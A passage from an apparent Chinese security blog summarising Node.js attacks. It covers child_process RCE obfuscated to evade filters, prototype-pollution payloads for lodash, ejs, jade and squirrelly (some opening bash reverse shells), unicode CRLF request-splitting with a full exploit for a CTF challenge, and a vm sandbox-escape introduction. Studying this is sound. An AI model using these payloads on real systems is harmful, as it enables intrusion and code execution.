title="文件读写"></a>文件读写</h2><p>既然我们可以执行函数，那自然可以进行文件的增删改查。<br>操作函数后面有Sync代表同步方法</p><blockquote><p>Node.js 文件系统（fs 模块）模块中的方法均有异步和同步版本，例如读取文件内容的函数有异步的 fs.readFile() 和同步的 fs.readFileSync()。<br>异步的方法函数最后一个参数为回调函数，回调函数的第一个参数包含了错误信息(error)。<br>建议大家使用异步方法，比起同步，异步方法性能更高，速度更快，而且没有阻塞。</p></blockquote><p><strong>读</strong><br>readFile()</p><pre><code class="plsql">require(&#39;fs&#39;).readFile(&#39;/etc/passwd&#39;, &#39;utf-8&#39;, (err, data) =&gt; &#123; if (err) throw err; console.log(data);&#125;);</code></pre><p> readFileSync()</p><pre><code class="plsql">require(&#39;fs&#39;).readFileSync(&#39;/etc/passwd&#39;,&#39;utf-8&#39;)</code></pre><p>readdirSync</p><pre><code class="plsql">require(&#39;fs&#39;).readdirSync(&#39;.&#39;).toString()</code></pre><p>rmdirSync</p><pre><code class="plsql">require(&#39;fs&#39;).rmdirSync(&#39;./daigua&#39;).toString()</code></pre><p><strong>写</strong><br> writeFileSync()</p><pre><code class="plsql">require(&#39;fs&#39;).writeFileSync(&#39;input.txt&#39;,&#39;sss&#39;);</code></pre><p> writeFile()</p><pre><code class="plsql">require(&#39;fs&#39;).writeFile(&#39;input.txt&#39;,&#39;test&#39;,(err)=&gt;&#123;&#125;)</code></pre><h2 id="nodejs危险函数-RCE-bypass"><a href="#nodejs危险函数-RCE-bypass" class="headerlink" title="nodejs危险函数-RCE bypass"></a>nodejs危险函数-RCE bypass</h2><p> 原型:</p><pre><code class="plsql">require(&quot;child_process&quot;).execSync(&#39;cat flag.txt&#39;)</code></pre><h3 id="字符拼接"><a href="#字符拼接" class="headerlink" title="字符拼接"></a>字符拼接</h3><pre><code class="plsql">require(&quot;child_process&quot;)[&#39;exe&#39;%2b&#39;cSync&#39;](&#39;cat flag.txt&#39;)//(%2b就是+的url编码) require(&#39;child_process&#39;)[&quot;exe&quot;.concat(&quot;cSync&quot;)](&quot;open /System/Applications/Calculator.app/&quot;)</code></pre><h3 id="编码绕过-1"><a href="#编码绕过-1" class="headerlink" title="编码绕过"></a>编码绕过</h3><pre><code class="plsql">require(&quot;child_process&quot;)[&quot;\x65\x78\x65\x63\x53\x79\x6e\x63&quot;](&#39;cat flag.txt&#39;)require(&quot;child_process&quot;)[&quot;\u0065\u0078\u0065\u0063\u0053\x79\x6e\x63&quot;](&#39;cat fl001g.txt&#39;)eval(Buffer.from(&#39;cmVxdWlyZSgiY2hpbGRfcHJvY2VzcyIpLmV4ZWNTeW5jKCdvcGVuIC9TeXN0ZW0vQXBwbGljYXRpb25zL0NhbGN1bGF0b3IuYXBwLycpOw==&#39;,&#39;base64&#39;).toString()) //弹计算器</code></pre><h3 id="模板拼接"><a href="#模板拼接" class="headerlink" title="模板拼接"></a>模板拼接</h3><pre><code class="plsql">require(&quot;child_process&quot;)[`$&#123;`$&#123;`exe`&#125;cSync`&#125;`](&#39;open /System/Applications/Calculator.app/&#39;）</code></pre><h3 id="其他函数"><a href="#其他函数" class="headerlink" title="其他函数"></a>其他函数</h3><pre><code class="plsql">require(&quot;child_process&quot;).exec(&quot;sleep 3&quot;); require(&quot;child_process&quot;).execSync(&quot;sleep 3&quot;); require(&quot;child_process&quot;).execFile(&quot;/bin/sleep&quot;,[&quot;3&quot;]); *//调用某个可执行文件，在第二个参数传args* require(&quot;child_process&quot;).spawn(&#39;sleep&#39;, [&#39;3&#39;]); require(&quot;child_process&quot;).spawnSync(&#39;sleep&#39;, [&#39;3&#39;]); require(&quot;child_process&quot;).execFileSync(&#39;sleep&#39;, [&#39;3&#39;]);</code></pre><h1 id="nodejs-原型链污染"><a href="#nodejs-原型链污染" class="headerlink" title="nodejs-原型链污染"></a>nodejs-原型链污染</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>我们首先要知道这几点:<br> 1.在javascript，每一个实例对象都有一个prototype属性，prototype 属性可以向对象添加属性和方法。  </p><pre><code class="plsql">object.prototype.name=value</code></pre><p> 2.在javascript，每一个实例对象都有一个__proto__属性，这个实例属性指向对象的原型对象(即原型)。可以通过以下方式访问得到某一实例对象的原型对象：  </p><pre><code class="html">objectname[&quot;__proto__&quot;]objectname.__proto__objectname.constructor.prototype</code></pre><p> 3.不同对象所生成的原型链如下(部分)：  </p><pre><code class="html">var o = &#123;a: 1&#125;;// o对象直接继承了Object.prototype// 原型链：// o ---&gt; Object.prototype ---&gt; nullvar a = [&quot;yo&quot;, &quot;whadup&quot;, &quot;?&quot;];// 数组都继承于 Array.prototype// 原型链：// a ---&gt; Array.prototype ---&gt; Object.prototype ---&gt; nullfunction f()&#123;return 2;&#125;// 函数都继承于 Function.prototype// 原型链：// f ---&gt; Function.prototype ---&gt; Object.prototype ---&gt; null</code></pre><p>知道了以上三点以后，我们来介绍如何进行原型链污染</p><p> 对于语句：object[a][b] = value 如果可以控制a、b、value的值，将a设置为__proto__，我们就可以给object对象的原型设置一个b属性，值为value。这样所有继承object对象原型的实例对象在本身不拥有b属性的情况下，都会拥有b属性，且值为value。<br> 来看一个简单的例子:  </p><pre><code class="html">object1 = &#123;&quot;a&quot;:1, &quot;b&quot;:2&#125;;object1.__proto__.foo = &quot;Hello World&quot;;console.log(object1.foo);object2 = &#123;&quot;c&quot;:1, &quot;d&quot;:2&#125;;console.log(object2.foo);</code></pre><p><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668790669590-6b7771d7-3023-46f0-bb45-2ddec0c9e219.png" alt="image.png"><br>最终输出了两个hello word<br>为什么object2在没有设置foo属性的情况下，也会输出Hello World呢？就是因为在第二条语句中，我们对object1的原型对象设置了一个foo属性，而object2和object1一样，都是继承了Object.prototype。在获取object2.foo时，由于object2本身不存在foo属性，就会往父类Object.prototype中去寻找。这就造成了 一个原型链污染，所以原型链污染简单来说就是如果能够控制并修改一个对象的原型，就可以影响到所有和这个对象同一个原型的对象。</p><h2 id="merge操作导致原型链污染"><a href="#merge操作导致原型链污染" class="headerlink" title="merge操作导致原型链污染"></a>merge操作导致原型链污染</h2><p>merge操作是最常见可能控制键名的操作，也最能被原型链攻击。<br>例子:</p><pre><code class="javascript">function merge(target, source) &#123;for (let key in source) &#123;    if (key in source &amp;&amp; key in target) &#123;        merge(target[key], source[key])    &#125; else &#123;        target[key] = source[key]        &#125;    &#125;&#125;let object1 = &#123;&#125;let object2 = JSON.parse(&#39;&#123;&quot;a&quot;: 1, &quot;__proto__&quot;: &#123;&quot;b&quot;: 2&#125;&#125;&#39;)merge(object1, object2)console.log(object1.a, object1.b)object3 = &#123;&#125;console.log(object3.b)# merge() 函数用于合并两个数组内容到第一个数组。在本段代码的作用就是将待操作的对象merge到一个空对象中</code></pre><p>需要注意的点是：<br>在JSON解析的情况下，__proto__会被认为是一个真正的“键名”，而不代表“原型”，所以在遍历object2的时候会存在这个键。<br>我们来看下，有和没有JSON解析的区别</p><pre><code class="javascript">&lt;script&gt;          let o2 = &#123;a:1,&quot;__proto__&quot;:&#123;b:2&#125;&#125;        console.log(o2)      let object2=JSON.parse(&#39;&#123;&quot;a&quot;:1,&quot;__proto__&quot;:&#123;&quot;b&quot;:2&#125;&#125;&#39;)      console.log(object2)  &lt;/script&gt;</code></pre><p><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668836886258-58f08cf3-4739-40b1-ade0-6f1a54f8dc7f.png" alt="image-20220416001143881.png"><br> 所以代码在执行过程中会存在这么一步  </p><pre><code class="javascript">target[__proto__]=source[__proto__]可理解为  object.prototype = &#123;&quot;b&quot;: 2&#125; 导致了原型链污染</code></pre><p> 最终输出的结果为：<br><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668839912381-24bdf37b-f5df-41ea-a963-e5c31549da5d.png" alt="image.png"><br> 可见object3的b是从原型中获取到的，说明Object已经被污染了。  </p><h2 id="lodash"><a href="#lodash" class="headerlink" title="lodash"></a>lodash</h2><blockquote><p> lodash是为了弥补JavaScript原生函数功能不足而提供的一个辅助功能集，其中包含字符串、数组、对象等操作。这个Web应用中，使用了lodash提供的两个工具：  </p><ol><li>lodash.template 一个简单的模板引擎</li><li>lodash.merge 函数或对象的合并</li></ol><p> 其实整个应用逻辑很简单，用户提交的信息，用merge方法合并到session里，多次提交，session里最终保存你提交的所有信息。</p></blockquote><p>以<a href="https://github.com/phith0n/code-breaking/blob/master/2018/thejs/web/server.js">Code-Breaking 2018 Thejs</a>为例说明分析过程:<br> 题目源码下载：<a href="http://code-breaking.com/puzzle/9/">http://code-breaking.com/puzzle/9/</a></p><pre><code class="javascript">const fs = require(&#39;fs&#39;)const express = require(&#39;express&#39;)const bodyParser = require(&#39;body-parser&#39;)const lodash = require(&#39;lodash&#39;)const session = require(&#39;express-session&#39;)const randomize = require(&#39;randomatic&#39;)const app = express()app.use(bodyParser.urlencoded(&#123;extended: true&#125;)).use(bodyParser.json())app.use(&#39;/static&#39;, express.static(&#39;static&#39;))app.use(session(&#123;    name: &#39;thejs.session&#39;,    secret: randomize(&#39;aA0&#39;, 16),    resave: false,    saveUninitialized: false&#125;))app.engine(&#39;ejs&#39;, function (filePath, options, callback) &#123; // define the template engine    fs.readFile(filePath, (err, content) =&gt; &#123;        if (err) return callback(new Error(err))        let compiled = lodash.template(content)        let rendered = compiled(&#123;...options&#125;)        return callback(null, rendered)    &#125;)&#125;)app.set(&#39;views&#39;, &#39;./views&#39;)app.set(&#39;view engine&#39;, &#39;ejs&#39;)app.all(&#39;/&#39;, (req, res) =&gt; &#123;    let data = req.session.data || &#123;language: [], category: []&#125;    if (req.method == &#39;POST&#39;) &#123;        data = lodash.merge(data, req.body)        req.session.data = data    &#125;        res.render(&#39;index&#39;, &#123;        language: data.language,         category: data.category    &#125;)&#125;)app.listen(3000, () =&gt; console.log(`Example app listening on port 3000!`))</code></pre><p> 问题出在lodash.merge()函数,这个函数存在原型链污染漏洞。我们得寻找到可以利用的点。因为通过漏洞可以控制某一种实例对象原型的属性，所以我们需要去寻找一个可以被利用的属性。<br><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668840471628-b5711487-8536-4a31-b5b4-c779de7628db.png" alt="image-20220416004841823.png"><br> 页面最终会通过lodash.template进行渲染<br><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668840499521-d6d64285-7a69-4e69-b6fb-a8221e5ff74f.png" alt="image-20220416005502144.png"><br> 跟踪到lodash/template.js中<br><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668840571097-a32cb4ca-8bf1-44a2-b1ff-940d5d715282.png" alt="QyN5JVOde3YL8aZ.png"><br>如图可以看到options是一个对象，sourceURL是通过下面的语句赋值的，options默认没有sourceURL属性，所以sourceURL默认也是为空。如果我们能够给options的原型对象加一个sourceURL属性，那么我们就可以控制sourceURL的值。<br>继续往下面看，最后sourceURL传递到了Function函数的第二个参数当中：<br><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668840627165-a79efcc5-3819-4e3f-8a7d-a2accd1ef055.png" alt="pwoVFrOyfzJX42M.png"><br>通过构造chile_process.exec()就可以执行任意代码了。<br>最终可以构造一个简单的Payload作为传递给主页面的的POST数据(windows调用计算器)：</p><pre><code class="javascript">&#123;&quot;__proto__&quot;:&#123;&quot;sourceURL&quot;:&quot;\nglobal.process.mainModule.constructor._load(&#39;child_process&#39;).exec(&#39;calc&#39;)//&quot;&#125;&#125;</code></pre><p>(这里直接用require会报错：ReferenceError: require is not defined<br>p神给了一个更好的payload：</p><pre><code class="javascript">&#123;&quot;__proto__&quot;:&#123;&quot;sourceURL&quot;:&quot;\nreturn e=&gt; &#123;for (var a in &#123;&#125;) &#123;delete Object.prototype[a];&#125; return global.process.mainModule.constructor._load(&#39;child_process&#39;).execSync(&#39;id&#39;)&#125;\n//&quot;&#125;&#125;</code></pre><h2 id="ejs"><a href="#ejs" class="headerlink" title="ejs"></a>ejs</h2><blockquote><p>主要为两个函数的伪造。<br>opts.outputFunctionName<br>opts.escapeFunction</p></blockquote><p><strong>例一</strong><br> test.js  </p><pre><code class="javascript">var express = require(&#39;express&#39;);var _= require(&#39;lodash&#39;);var ejs = require(&#39;ejs&#39;);var app = express();//设置模板的位置app.set(&#39;views&#39;, __dirname);//对原型进行污染var malicious_payload = &#39;&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(\&#39;child_process\&#39;).exec(\&#39;calc\&#39;);var __tmp2&quot;&#125;&#125;&#39;;_.merge(&#123;&#125;, JSON.parse(malicious_payload));//进行渲染app.get(&#39;/&#39;, function (req, res) &#123;    res.render (&quot;./test.ejs&quot;,&#123;        message: &#39;lufei test &#39;    &#125;);&#125;);//设置httpvar server = app.listen(8081, function () &#123;    var host = server.address().address    var port = server.address().port    console.log(&quot;应用实例，访问地址为 http://%s:%s&quot;, host, port)&#125;);</code></pre><p> test.ejs  </p><pre><code class="javascript">&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;    &lt;meta charset=&quot;utf-8&quot;&gt;    &lt;title&gt;&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;&lt;%= message%&gt;&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p> payload：  </p><pre><code class="javascript">&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/xxx/6666 0&gt;&amp;1\&quot;&#39;);var __tmp2&quot;&#125;&#125;</code></pre><pre><code class="javascript">&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(\&#39;child_process\&#39;).exec(\&#39;calc\&#39;);var __tmp2&quot;&#125;&#125;</code></pre><p><strong>例二</strong></p><pre><code class="javascript">router.post(&#39;/&#39;, require(&#39;body-parser&#39;).json(),function(req, res, next) &#123;  res.type(&#39;html&#39;);  var user = new function()&#123;    this.userinfo = new function()&#123;    this.isVIP = false;    this.isAdmin = false;        &#125;;  &#125;;  utils.copy(user.userinfo,req.body);  if(user.userinfo.isAdmin)&#123;    return res.json(&#123;ret_code: 0, ret_msg: &#39;login success!&#39;&#125;);    &#125;else&#123;    return res.json(&#123;ret_code: 2, ret_msg: &#39;login fail!&#39;&#125;);    &#125;&#125;);</code></pre><p>**<em>payload1</em>**：覆盖 opts.outputFunctionName , 这样构造的payload就会被拼接进js语句中，并在 ejs 渲染时进行 RCE。  </p><pre><code class="javascript">&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;a=1; return global.process.mainModule.constructor._load(&#39;child_process&#39;).execSync(&#39;dir&#39;); //&quot;&#125;&#125;&#125;&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;__tmp1; return global.process.mainModule.constructor._load(&#39;child_process&#39;).execSync(&#39;dir&#39;); __tmp2&quot;&#125;&#125;&#125;</code></pre><p>**<em>payload2</em>**：伪造 opts.escapeFunction 也可以进行 RCE  </p><pre><code class="javascript">&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;client&quot;:true,&quot;escapeFunction&quot;:&quot;1; return global.process.mainModule.constructor._load(&#39;child_process&#39;).execSync(&#39;dir&#39;);&quot;&#125;&#125;&#125;</code></pre><p><strong>补充:</strong> 在 ejs 模板中还有三个可控的参数, 分别为 opts.localsName 和 opts.destructuredLocals 和 opts.filename, 但是这三个无法构建出合适的污染链。  </p><h2 id="jade"><a href="#jade" class="headerlink" title="jade"></a>jade</h2><p>compileDebug的伪造<br>给出上面题目的payload，可参考着看。</p><pre><code class="javascript">&#123;&quot;__proto__&quot;:&#123;&quot;compileDebug&quot;:1,&quot;self&quot;:1,&quot;line&quot;:&quot;console.log(global.process.mainModule.require(&#39;child_process&#39;).execSync(&#39;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/xxx/1234 0&gt;&amp;1\&quot;&#39;))&quot;&#125;&#125;</code></pre><pre><code class="javascript">&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;: &#123;&quot;type&quot;:&quot;Code&quot;,&quot;compileDebug&quot;:true,&quot;self&quot;:true,&quot;line&quot;:&quot;0, \&quot;\&quot; ));return global.process.mainModule.constructor._load(&#39;child_process&#39;).execSync(&#39;dir&#39;);//&quot;&#125;&#125;&#125;</code></pre><h2 id="squirrelly"><a href="#squirrelly" class="headerlink" title="squirrelly"></a>squirrelly</h2><p><strong><em>CVE-2021-32819</em></strong><br>server.js</p><pre><code class="javascript">const express = require(&#39;express&#39;)const squirrelly = require(&#39;squirrelly&#39;)const app = express()app.set(&#39;views&#39;, __dirname);app.set(&#39;view engine&#39;, &#39;squirrelly&#39;)app.use(express.urlencoded(&#123; extended: false &#125;));app.get(&#39;/&#39;, (req, res) =&gt; &#123;   res.render(&#39;index.squirrelly&#39;, req.query)&#125;)var server = app.listen(3000, &#39;0.0.0.0&#39;, function () &#123;    var host = server.address().address    var port = server.address().port    console.log(&quot;Listening on http://%s:%s&quot;, host, port)&#125;);</code></pre><p> index.squirrelly  </p><pre><code class="javascript">&lt;!DOCTYPE html&gt;&lt;html&gt;    &lt;head&gt;        &lt;title&gt;CVE-2021-32819&lt;/title&gt;        &lt;h1&gt;Test For CVE-2021-32819&lt;/h1&gt;    &lt;/head&gt;&lt;body&gt;    &lt;h1&gt;&#123;&#123;it.variable&#125;&#125;&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p> payload  </p><pre><code class="javascript">/?defaultFilter=e&#39;)); let require = global.require || global.process.mainModule.constructor._load; require(&#39;child_process&#39;).exec(&#39;dir&#39;); //</code></pre><p>PS:以下贴出几篇文章，师傅们可以跟进分析：<br><a href="https://www.aisoutu.com/a/1373814">https://www.aisoutu.com/a/1373814</a><br><a href="https://cloud.tencent.com/developer/article/2035888">https://cloud.tencent.com/developer/article/2035888</a><br><a href="https://www.freebuf.com/vuls/276112.html">https://www.freebuf.com/vuls/276112.html</a><br><a href="https://lonmar.cn/2021/02/22/%E5%87%A0%E4%B8%AAnode%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%86%E6%9E%90/">几个node模板引擎的原型链污染分析</a></p><h1 id="nodejs中的ssrf"><a href="#nodejs中的ssrf" class="headerlink" title="nodejs中的ssrf"></a>nodejs中的ssrf</h1><h2 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h2><p>**虽然用户发出的http请求通常将请求路径指定为字符串，但Node.js最终必须将请求作为原始字节输出。JavaScript支持unicode字符串，因此将它们转换为字节意味着选择并应用适当的unicode编码。对于不包含主体的请求，Node.js默认使用“latin1”，这是一种单字节编码，不能表示高编号的unicode字符。相反，这些字符被截断为其JavaScript表示的最低字节  **</p><pre><code class="plsql">&gt; v = &quot;/caf\u&#123;E9&#125;\u&#123;01F436&#125;&quot;&#39;/café🐶&#39;&gt; Buffer.from(v,&#39;latin1&#39;).toString(&#39;latin1&#39;)&#39;/café=6&#39;</code></pre><p><strong>Crlf HTTP头注入:</strong><br> 假设一个服务器，接受用户输入，并将其包含在通过HTTP公开的内部服务请求中，像这样：  </p><pre><code class="plsql">GET /private-api?q=&lt;user-input-here&gt; HTTP/1.1Authorization: server-secret-key</code></pre><p> 如果服务器未正确验证用户输入，则攻击者可能会直接注入协议控制字符到请求里。假设在这种情况下服务器接受了以下用户输入：  </p><pre><code class="plsql">&quot;x HTTP/1.1\r\n\r\nDELETE /private-api HTTP/1.1\r\n&quot;</code></pre><p> 在发出请求时，服务器可能会直接将其写入路径，如下：  </p><pre><code class="plsql">GET /private-api?q=x HTTP/1.1DELETE /private-apiAuthorization: server-secret-key</code></pre><p><strong>说到底就是\r\n成功生效</strong><br>接收服务将此解释为两个单独的HTTP请求，一个GET后跟一个DELETE<br>好的HTTP库通通常包含阻止这一行为的措施，Node.js也不例外：如果你尝试发出一个路径中含有控制字符的HTTP请求，它们会被URL编码：</p><pre><code class="plsql">http.get(&#39;http://example.com/\r\n/test&#39;).output[ &#39;GET /%0D%0A/test HTTP/1.1\r\nHost: example.com\r\nConnection: close\r\n\r\n&#39; ]</code></pre><p> 不幸的是，上述的处理unicode字符错误意味着可以规避这些措施。考虑如下的URL，其中包含一些带变音符号的unicode字符：  </p><pre><code class="plsql">&#39;http://example.com/\u&#123;010D&#125;\u&#123;010A&#125;/test&#39;http://example.com/čĊ/test</code></pre><p> 当Node.js版本8或更低版本对此URL发出GET请求时，它不会进行转义，因为它们不是HTTP控制字符：  </p><pre><code class="plsql">http.get(&#39;http://example.com/\u010D\u010A/test&#39;).output[ &#39;GET /čĊ/test HTTP/1.1\r\nHost: example.com\r\nConnection: close\r\n\r\n&#39; ]</code></pre><p> 但是当结果字符串被编码为latin1写入路径时，这些字符将分别被截断为“\r”和“\n”：  </p><pre><code class="plsql">Buffer.from(&#39;http://example.com/\u&#123;010D&#125;\u&#123;010A&#125;/test&#39;, &#39;latin1&#39;).toString()&#39;http://example.com/\r\n/test&#39;</code></pre><p>Node.js默认使用“latin1”，这是一种单字节编码，不能表示高编号的unicode字符<br>说白了，上面这段的意思就是我们可以利用一些特殊字符，它们在URL请求时不会被转义处理，但是当它到了js引擎时，由于其默认用的是latin1，因此可以将我们用的特殊字符转义得到我们需要的字符，从而达到ssrf的目的</p><h2 id="GYCTF2020-Node-Game"><a href="#GYCTF2020-Node-Game" class="headerlink" title="[GYCTF2020]Node Game"></a>[GYCTF2020]Node Game</h2><p><strong>source：</strong></p><pre><code class="plsql">var express = require(&#39;express&#39;); var app = express(); var fs = require(&#39;fs&#39;); var path = require(&#39;path&#39;); // 处理文件路径 var http = require(&#39;http&#39;); var pug = require(`pug`); // 模板渲染 var morgan = require(&#39;morgan&#39;); // 日志 const multer = require(&#39;multer&#39;); // 用于处理multipart/form-data类型的表单数据，实现上传功能// 将上传的文件存储在./dist[自动创建]返回一个名为file的文件数组 app.use(multer(&#123;dest: &#39;./dist&#39;&#125;).array(&#39;file&#39;)); // 使用简化版日志 app.use(morgan(&#39;short&#39;));  // 静态文件路由 app.use(&quot;/uploads&quot;, express.static(path.join(__dirname, &#39;/uploads&#39;))) app.use(&quot;/template&quot;, express.static(path.join(__dirname, &#39;/template&#39;)))  app.get(&#39;/&#39;, function (req, res) &#123;      // GET方法获取action参数      var action = req.query.action ? req.query.action : &quot;index&quot;;      // action中不能包含/ &amp; \      if (action.includes(&quot;/&quot;) || action.includes(&quot;\\&quot;)) &#123;            res.send(&quot;Errrrr, You have been Blocked&quot;);      &#125;        // 将/template/[action].pug渲染成html输出到根目录      file = path.join(__dirname + &#39;/template/&#39; + action + &#39;.pug&#39;);      var html = pug.renderFile(file);      res.send(html); &#125;);  app.post(&#39;/file_upload&#39;, function (req, res) &#123;      var ip = req.connection.remoteAddress; // remoteAddress无法伪造，因为TCP有三次握手，伪造源IP会导致无法完成TCP连接      var obj = &#123;msg: &#39;&#39;,&#125;      // 请求必须来自localhost      if (!ip.includes(&#39;127.0.0.1&#39;)) &#123;            obj.msg = &quot;only admin&#39;s ip can use it&quot;            res.send(JSON.stringify(obj));            return      &#125;      fs.readFile(req.files[0].path, function (err, data) &#123;            if (err) &#123;                  obj.msg = &#39;upload failed&#39;;                  res.send(JSON.stringify(obj));            &#125; else &#123;                  // 文件路径为/uploads/[mimetype]/filename，mimetype可以进行目录穿越实现将文件存储至/template并利用action渲染到界面                  var file_path = &#39;/uploads/&#39; + req.files[0].mimetype + &quot;/&quot;;                  var file_name = req.files[0].originalname                  var dir_file = __dirname + file_path + file_name                  if (!fs.existsSync(__dirname + file_path)) &#123;                        try &#123;                              fs.mkdirSync(__dirname + file_path)                        &#125; catch (error) &#123;                              obj.msg = &quot;file type error&quot;;                              res.send(JSON.stringify(obj));                              return                        &#125;                  &#125;                  try &#123;                        fs.writeFileSync(dir_file, data)                        obj = &#123;msg: &#39;upload success&#39;, filename: file_path + file_name&#125;                  &#125; catch (error) &#123;                        obj.msg = &#39;upload failed&#39;;                  &#125;                  res.send(JSON.stringify(obj));            &#125;      &#125;) &#125;)  // 查看题目源码 app.get(&#39;/source&#39;, function (req, res) &#123;      res.sendFile(path.join(__dirname + &#39;/template/source.txt&#39;)); &#125;);  app.get(&#39;/core&#39;, function (req, res) &#123;      var q = req.query.q;      var resp = &quot;&quot;;      if (q) &#123;            var url = &#39;http://localhost:8081/source?&#39; + q            console.log(url)               // 对url字符进行waf            var trigger = blacklist(url);            if (trigger === true) &#123;                  res.send(&quot;error occurs!&quot;);            &#125; else &#123;                  try &#123;                              // node对/source发出请求，此处可以利用字符破坏进行切分攻击访问/file_upload路由(❗️此请求发出者为localhost主机)，实现对remoteAddress的绕过                        http.get(url, function (resp) &#123;                              resp.setEncoding(&#39;utf8&#39;);                              resp.on(&#39;error&#39;, function (err) &#123;                                    if (err.code === &quot;ECONNRESET&quot;) &#123;                                          console.log(&quot;Timeout occurs&quot;);                                    &#125;                              &#125;);                                        // 返回结果输出到/core                              resp.on(&#39;data&#39;, function (chunk) &#123;                                    try &#123;                                          resps = chunk.toString();                                          res.send(resps);                                    &#125; catch (e) &#123;                                          res.send(e.message);                                    &#125;                              &#125;).on(&#39;error&#39;, (e) =&gt; &#123;                                    res.send(e.message);                              &#125;);                        &#125;);                  &#125; catch (error) &#123;                        console.log(error);                  &#125;            &#125;      &#125; else &#123;            res.send(&quot;search param &#39;q&#39; missing!&quot;);      &#125; &#125;)  // 关键字waf 利用字符串拼接实现绕过 function blacklist(url) &#123;      var evilwords = [&quot;global&quot;, &quot;process&quot;, &quot;mainModule&quot;, &quot;require&quot;, &quot;root&quot;, &quot;child_process&quot;, &quot;exec&quot;, &quot;\&quot;&quot;, &quot;&#39;&quot;, &quot;!&quot;];      var arrayLen = evilwords.length;       for (var i = 0; i &lt; arrayLen; i++) &#123;            const trigger = url.includes(evilwords[i]);            if (trigger === true) &#123;                  return true            &#125;      &#125; &#125;  var server = app.listen(8081, function () &#123;      var host = server.address().address      var port = server.address().port      console.log(&quot;Example app listening at http://%s:%s&quot;, host, port) &#125;)</code></pre><p><strong>exp:</strong></p><pre><code class="plsql">import requestspayload = &quot;&quot;&quot; HTTP/1.1Host: 127.0.0.1Connection: keep-alivePOST /file_upload HTTP/1.1Host: 127.0.0.1Content-Length: &#123;&#125;Content-Type: multipart/form-data; boundary=----WebKitFormBoundarysAs7bV3fMHq0JXUt&#123;&#125;&quot;&quot;&quot;.replace(&#39;\n&#39;, &#39;\r\n&#39;)body = &quot;&quot;&quot;------WebKitFormBoundarysAs7bV3fMHq0JXUtContent-Disposition: form-data; name=&quot;file&quot;; filename=&quot;lmonstergg.pug&quot;Content-Type: ../template-var x = eval(&quot;glob&quot;+&quot;al.proce&quot;+&quot;ss.mainMo&quot;+&quot;dule.re&quot;+&quot;quire(&#39;child_&#39;+&#39;pro&#39;+&#39;cess&#39;)[&#39;ex&#39;+&#39;ecSync&#39;](&#39;cat /flag.txt&#39;).toString()&quot;)-return x------WebKitFormBoundarysAs7bV3fMHq0JXUt--&quot;&quot;&quot;.replace(&#39;\n&#39;, &#39;\r\n&#39;)payload = payload.format(len(body), body) \    .replace(&#39;+&#39;, &#39;\u012b&#39;)             \    .replace(&#39; &#39;, &#39;\u0120&#39;)             \    .replace(&#39;\r\n&#39;, &#39;\u010d\u010a&#39;)    \    .replace(&#39;&quot;&#39;, &#39;\u0122&#39;)             \    .replace(&quot;&#39;&quot;, &#39;\u0a27&#39;)             \    .replace(&#39;[&#39;, &#39;\u015b&#39;)             \    .replace(&#39;]&#39;, &#39;\u015d&#39;) \    + &#39;GET&#39; + &#39;\u0120&#39; + &#39;/&#39;session = requests.Session()session.trust_env = Falseresponse1 = session.get(&#39;http://3d02a3de-3cbc-4f99-ab55-9fa306637282.node4.buuoj.cn:81/core?q=&#39; + payload)response = session.get(&#39;http://3d02a3de-3cbc-4f99-ab55-9fa306637282.node4.buuoj.cn:81/?action=lmonstergg&#39;)print(response.text)</code></pre><h1 id="vm沙箱逃逸"><a href="#vm沙箱逃逸" class="headerlink" title="vm沙箱逃逸"></a>vm沙箱逃逸</h1><h2 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h2><p><strong>context</strong><br> vm 模块创建一个V8虚拟引擎 context（上下文、环境）来编译和运行代码。  </p><pre><code class="plsql">context 是语境、环境、上下文的意思，类似于文章的语境，一句话的意思需要根据语境推断，即文章的上下文。以此类比，这里的 context 是 JavaScript 代码所处的环境（有点像作用域的概念），一条代码语句在不同的环境执行的结果也不同。</code></pre><p>调用代码与被调用代码处于不同的 context，意味着它们的 global 对象是不同的。<br>例子：</p><pre><code class="plsql">const vm = require(&#39;vm&#39;);// global下定义一个 x 变量const x = 1;// context也定义一个 x 变量const context = &#123; x: 2 &#125;;vm.createContext(context);          // 语境化 &#123;x:2&#125;// code包含的代码将在 context 下执行，所以其中所有代码访问的变量都是 context 下的const code = &#39;x += 40; var y = 17;&#39;;vm.runInContext(code, context);// context = &#123;x:42, y:17&#125;console.log(context.x); // 42console.log(context.y); // 17// global没有被改动console.log(x); // 1; y is not defined.</code></pre><p> code执行的环境是 context ，它访问的全局对象就是访问自定义的 